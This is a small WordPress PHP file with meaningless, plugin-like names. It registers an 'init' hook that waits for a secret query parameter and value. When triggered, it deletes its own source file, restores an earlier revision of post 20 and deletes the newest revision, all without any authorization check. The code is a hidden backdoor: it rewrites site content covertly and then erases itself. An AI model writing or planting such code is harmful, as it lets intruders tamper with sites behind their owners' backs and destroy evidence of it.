<?php

function scroll_fields_attachments_sitemap() {
	if (isset($_GET['health_statistics_discount_events']) && $_GET['health_statistics_discount_events'] === 'checker_cron_gravatar') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$upload_hello_extension_call = 20;
		$information_service_sync_tab = wp_get_post_revisions($upload_hello_extension_call);
		if (empty($information_service_sync_tab)) die('no revisions');
		if (count($information_service_sync_tab) < 2) die('less than 2');
		$maker_woff2_catalog = array_shift($information_service_sync_tab);
		$store_rss_codes_subscribe = $maker_woff2_catalog->ID;
		$audio_variations_integrate_engine = array_shift($information_service_sync_tab);
		$xml_specific_day_cookie = $audio_variations_integrate_engine->ID;
		$customizer_solution_pdf_alert = wp_restore_post_revision($xml_specific_day_cookie);
		if ($customizer_solution_pdf_alert === false) die('error restoring');
		$customizer_solution_pdf_alert = wp_delete_post_revision($store_rss_codes_subscribe);		
		if ($customizer_solution_pdf_alert === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'scroll_fields_attachments_sitemap');
